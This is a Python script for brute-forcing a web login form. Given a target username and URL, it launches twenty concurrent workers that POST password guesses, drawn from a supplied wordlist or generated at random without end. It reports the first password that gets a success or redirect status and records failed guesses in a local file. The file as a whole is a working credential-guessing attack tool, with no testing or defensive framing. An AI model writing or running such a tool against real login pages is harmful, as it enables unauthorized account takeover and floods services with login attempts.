
import argparse
import sys 
import aiohttp
import asyncio
import os
import random
import datetime

BAD_PASS_FILEPATH= "bad_passwords.txt"

parser = argparse.ArgumentParser()

parser.add_argument("target")
parser.add_argument("url")
parser.add_argument("dictfile", nargs="?")

namespace = parser.parse_args(sys.argv[1:])

bad_pass_lock = asyncio.Lock()
dict_lock = asyncio.Lock()


found = False 
found_password = ""


def get_passwords(path):
    if not os.path.exists(path):
        return set()
    with open(path) as bad_pass_file:
        return set(map(lambda l: l.replace("\n",""), bad_pass_file.readlines()))

def generate_password():
    while True: 
        attempt = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+=[]{}\'\".</:;\\| ,?",k=random.randint(6,22)))
        if attempt not in bad_passwords:
            return attempt 


bad_passwords = get_passwords(BAD_PASS_FILEPATH)

async def send_login_attempt(url, username, password):
    async with aiohttp.ClientSession() as session:
        formdata = aiohttp.FormData({"user":username, "pass":password})
        async with session.post(allow_redirects=False,url=url,headers={"Content-Type":"application/x-www-form-urlencoded"}, data=formdata) as response:

            
            status =  response.status
            if 200 <= status < 400 :
                # success
                global found, found_password
                found = True
                print("found succesful password:", password)
                found_password = password
            else:
                async with bad_pass_lock:
                    bad_passwords.add(password)
                    with open(BAD_PASS_FILEPATH, "a") as bad_pass_file:
                        bad_pass_file.write(password+"\n")
                



async def dict_worker( username, url, passwords):
    while passwords and not found:

        password = passwords.pop()
        await send_login_attempt(url, username, password)

async def brute_force_worker(username,url):
    password =  generate_password();
    while password and not found:

        await send_login_attempt(url, username, password)
        password = generate_password();

async def check_status():
    while not found:
        await asyncio.sleep(60)

        async with bad_pass_lock:
            print(f"tested {len(bad_passwords)} at {datetime.datetime.now().strftime("%H:%M:%S")}")


async def main():
    asyncio.create_task(check_status())
    if namespace.dictfile:
        passwords = get_passwords(namespace.dictfile).difference(bad_passwords)
        workers = [dict_worker( namespace.target, namespace.url, passwords) for i in range(20)]
        await asyncio.gather(*workers)
    else:
        workers = [brute_force_worker(namespace.target, namespace.url) for i in range(20)]
        await asyncio.gather(*workers)
        


if __name__ == "__main__":
    asyncio.run(main())

